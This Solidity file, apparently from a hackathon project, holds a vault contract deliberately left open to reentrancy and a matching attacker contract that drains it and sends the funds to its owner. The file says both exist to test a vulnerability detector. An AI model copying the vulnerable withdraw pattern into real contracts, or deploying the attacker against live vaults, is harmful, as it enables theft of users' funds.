// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

/**
 * @title VulnerableVault
 * @notice INTENTIONALLY VULNERABLE CONTRACT for testing Sentinel
 * @dev This contract has a reentrancy vulnerability - DO NOT USE IN PRODUCTION
 * @track Chainlink Convergence Hackathon 2026 - Testing Only
 */

contract VulnerableVault is Pausable, AccessControl {
    
    bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");
    
    /// @notice User balances
    mapping(address => uint256) public balances;
    
    /// @notice Total ETH deposited
    uint256 public totalDeposits;
    
    /// @notice Emergency pause info (for demo tracking)
    address public lastPausedBy;
    uint256 public lastPausedAt;
    bytes32 public lastVulnHash;
    
    /// @notice Events
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event EmergencyPaused(address indexed pauser, bytes32 vulnHash);
    event EmergencyUnpaused(address indexed unpauser);
    
    constructor(address guardian) {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(PAUSER_ROLE, guardian); // Sentinel Guardian can pause
        _grantRole(PAUSER_ROLE, msg.sender); // Owner can also pause
    }
    
    /**
     * @notice Deposit ETH into the vault
     */
    function deposit() external payable whenNotPaused {
        require(msg.value > 0, "Must send ETH");
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @notice Withdraw ETH from the vault
     * @dev VULNERABLE TO REENTRANCY - external call before state update
     */
    function withdraw() external whenNotPaused {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        // VULNERABILITY: External call before state update!
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State update happens AFTER external call (wrong!)
        balances[msg.sender] = 0;
        totalDeposits -= amount;
        
        emit Withdrawal(msg.sender, amount);
    }
    
    /**
     * @notice Get contract balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @notice Get user balance
     */
    function getUserBalance(address user) external view returns (uint256) {
        return balances[user];
    }
    
    /**
     * @notice Emergency pause - callable by Sentinel Guardian
     * @param vulnHash Hash of detected vulnerability (for audit trail)
     */
    function pause(bytes32 vulnHash) external onlyRole(PAUSER_ROLE) {
        _pause();
        lastPausedBy = msg.sender;
        lastPausedAt = block.timestamp;
        lastVulnHash = vulnHash;
        emit EmergencyPaused(msg.sender, vulnHash);
    }
    
    /**
     * @notice Unpause - only admin
     */
    function unpause() external onlyRole(DEFAULT_ADMIN_ROLE) {
        _unpause();
        emit EmergencyUnpaused(msg.sender);
    }
    
    /**
     * @notice Check if contract can be paused by an address
     */
    function canPause(address account) external view returns (bool) {
        return hasRole(PAUSER_ROLE, account);
    }
    
    // Allow receiving ETH
    receive() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }
}

/**
 * @title MaliciousAttacker
 * @notice Attack contract that exploits VulnerableVault's reentrancy
 * @dev Used for testing Sentinel's detection capabilities
 */
contract MaliciousAttacker {
    
    VulnerableVault public target;
    address public owner;
    uint256 public attackCount;
    uint256 public stolenAmount;
    
    constructor(address _target) {
        target = VulnerableVault(_target);
        owner = msg.sender;
    }
    
    /**
     * @notice Start the attack
     */
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        attackCount = 0;
        stolenAmount = 0;
        
        // Initial deposit
        target.deposit{value: msg.value}();
        
        // Trigger reentrancy
        target.withdraw();
    }
    
    /**
     * @notice Receive function that reenters
     */
    receive() external payable {
        if (address(target).balance >= 1 ether && attackCount < 10) {
            attackCount++;
            stolenAmount += msg.value;
            target.withdraw();
        }
    }
    
    /**
     * @notice Withdraw stolen funds
     */
    function withdrawStolen() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
